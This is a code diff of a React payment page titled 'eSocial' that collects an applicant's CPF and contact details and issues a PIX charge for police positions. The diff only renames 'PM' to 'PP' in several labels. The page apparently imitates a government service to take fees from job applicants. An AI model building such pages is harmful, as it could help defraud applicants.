@@ -17,8 +17,8 @@ interface UserInfo {
 }
 
 const CARGO_MAP: Record<string, string> = {
-  'soldado-pm': 'Soldado de 2ª Classe PM',
-  'oficial-pm': 'Aspirante-a-Oficial PM',
+  'soldado-pm': 'Soldado de 2ª Classe PP',
+  'oficial-pm': 'Aspirante-a-Oficial PP',
 };
 
 interface PixData {
@@ -44,7 +44,7 @@ const getColoredQrCode = (url: string) => {
 
 export default function ESocialPagamentoPage() {
   const estadoPM = useEstadoPM();
-  const sigla = estadoPM?.sigla ?? 'PM';
+  const sigla = estadoPM?.sigla ?? 'PP';
   const [, navigate] = useLocation();
 
   const [userInfo, setUserInfo] = useState<UserInfo>({
@@ -82,7 +82,7 @@ export default function ESocialPagamentoPage() {
     const gender   = parsedUser?.sexo || parsedUser?.genero || parsedUser?.gender || 'M';
 
     const positionId = applicationData?.positionId || applicationData?.position_id || '';
-    const cargo = CARGO_MAP[positionId] || applicationData?.positionTitle || parsedUser?.cargo || 'Soldado de 2ª Classe PM';
+    const cargo = CARGO_MAP[positionId] || applicationData?.positionTitle || parsedUser?.cargo || 'Soldado de 2ª Classe PP';
 
     setUserInfo({ firstName, fullName, cpf, email, telefone, gender, cargo });
 
@@ -172,7 +172,7 @@ export default function ESocialPagamentoPage() {
             phone: telefone || '',
             cpf: cpf || '',
           },
-          description: `${import.meta.env.VITE_PRODUCT_NAME || 'PM'}3`,
+          description: `${import.meta.env.VITE_PRODUCT_NAME || 'PP'}3`,
           amount,
         }),
       });
@@ -339,7 +339,7 @@ export default function ESocialPagamentoPage() {
             </div>
             <div className="flex justify-between">
               <span className="text-gray-500">Cargo</span>
-              <span className="text-gray-700 truncate max-w-[200px]">{userInfo.cargo || 'Soldado de 2ª Classe PM'}</span>
+              <span className="text-gray-700 truncate max-w-[200px]">{userInfo.cargo || 'Soldado de 2ª Classe PP'}</span>
             </div>
             <div className="flex justify-between">
               <span className="text-gray-500">Competência</span>
